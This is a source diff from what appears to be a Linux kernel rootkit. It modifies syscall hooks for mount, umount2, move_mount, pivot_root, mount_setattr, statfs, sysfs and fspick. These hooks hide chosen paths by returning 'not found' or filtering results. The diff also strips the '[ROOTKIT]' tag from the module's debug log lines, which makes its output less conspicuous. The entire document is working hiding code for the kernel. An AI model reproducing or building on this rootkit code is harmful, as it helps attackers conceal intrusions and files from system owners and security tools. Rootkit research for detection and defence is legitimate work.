@@ -23,8 +23,8 @@ SYSCALL_HOOK_HANDLER5(mount, orig_mount, p_regs, char __user *, s_dev_name, char
                       s_dir_name, char __user *, s_type, unsigned long, ui64_flags, void __user *,
                       p_data)
 {
-    pr_info("[ROOTKIT] mount(%p, %p, %p, %#lx, %p)\n", s_dev_name, s_dir_name, s_type, ui64_flags,
-            p_data);
+    pr_dev_info("mount(%p, %p, %p, %#lx, %p)\n", s_dev_name, s_dir_name, s_type, ui64_flags,
+                p_data);
 
     // Check if the target directory is hidden
     if (is_pathname_hidden(AT_FDCWD, s_dir_name, LOOKUP_FOLLOW)) {
@@ -37,7 +37,7 @@ SYSCALL_HOOK_HANDLER5(mount, orig_mount, p_regs, char __user *, s_dev_name, char
 // sys_umount2 syscall hook handler
 SYSCALL_HOOK_HANDLER2(umount2, orig_umount2, p_regs, char __user *, s_name, int, i32_flags)
 {
-    pr_info("[ROOTKIT] umount2(%p, %s%#x)\n", s_name, SIGNED_ARG(i32_flags));
+    pr_dev_info("umount2(%p, %s%#x)\n", s_name, SIGNED_ARG(i32_flags));
 
     IF_U (i32_flags & ~(MNT_FORCE | MNT_DETACH | MNT_EXPIRE | UMOUNT_NOFOLLOW)) {
         return -EINVAL;
@@ -54,8 +54,8 @@ SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, ch
 {
     unsigned int ui32_lflags = 0;
 
-    pr_info("[ROOTKIT] move_mount(%d, %p, %d, %p, %#x)\n", i32_from_dfd, s_from_pathname,
-            i32_to_dfd, s_to_pathname, ui32_flags);
+    pr_dev_info("move_mount(%d, %p, %d, %p, %#x)\n", i32_from_dfd, s_from_pathname, i32_to_dfd,
+                s_to_pathname, ui32_flags);
 
     IF_U (ui32_flags & ~MOVE_MOUNT__MASK) {
         return -EINVAL;
@@ -87,7 +87,7 @@ SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, ch
 SYSCALL_HOOK_HANDLER2(pivot_root, orig_pivot_root, p_regs, const char __user *, s_new_root,
                       const char __user *, s_put_old)
 {
-    pr_info("[ROOTKIT] pivot_root(%p, %p)\n", s_new_root, s_put_old);
+    pr_dev_info("pivot_root(%p, %p)\n", s_new_root, s_put_old);
 
     if (is_pathname_hidden(AT_FDCWD, s_put_old, LOOKUP_FOLLOW)) {
         return -ENOENT;
@@ -104,8 +104,8 @@ SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, c
     int i32_err;
     struct mount_attr attr;
 
-    pr_info("[ROOTKIT] mount_setattr(%d, %p, %#x, %p, %zu)\n", i32_dfd, s_path, ui32_flags, p_uattr,
-            sz_usize);
+    pr_dev_info("mount_setattr(%d, %p, %#x, %p, %zu)\n", i32_dfd, s_path, ui32_flags, p_uattr,
+                sz_usize);
 
     // Use same checks as in fs/namespace.c:4269
 
@@ -153,7 +153,7 @@ SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, c
 SYSCALL_HOOK_HANDLER2(statfs, orig_statfs, p_regs, const char __user *, s_pathname,
                       struct statfs __user *, p_buf)
 {
-    pr_info("[ROOTKIT] statfs(%p, %p)\n", s_pathname, p_buf);
+    pr_dev_info("statfs(%p, %p)\n", s_pathname, p_buf);
 
     return do_check_hidden(orig_statfs, p_regs, AT_FDCWD, s_pathname, 0);
 }
@@ -162,7 +162,7 @@ SYSCALL_HOOK_HANDLER2(statfs, orig_statfs, p_regs, const char __user *, s_pathna
 SYSCALL_HOOK_HANDLER3(sysfs, orig_sysfs, p_regs, int, i32_option, unsigned long, ui64_arg1,
                       unsigned long, ui64_arg2)
 {
-    pr_info("[ROOTKIT] sysfs(%d, %lu, %lu)\n", i32_option, ui64_arg1, ui64_arg2);
+    pr_dev_info("sysfs(%d, %lu, %lu)\n", i32_option, ui64_arg1, ui64_arg2);
 
     switch (i32_option) {
     case 1:
@@ -184,7 +184,7 @@ SYSCALL_HOOK_HANDLER3(fspick, orig_fspick, p_regs, int, i32_dfd, const char __us
 {
     int i32_at_flags = 0;
 
-    pr_info("[ROOTKIT] fspick(%d, %p, %#x)\n", i32_dfd, s_path, ui32_flags);
+    pr_dev_info("fspick(%d, %p, %#x)\n", i32_dfd, s_path, ui32_flags);
 
     IF_U ((ui32_flags & ~(FSPICK_CLOEXEC | FSPICK_SYMLINK_NOFOLLOW | FSPICK_NO_AUTOMOUNT |
                           FSPICK_EMPTY_PATH)) != 0) {
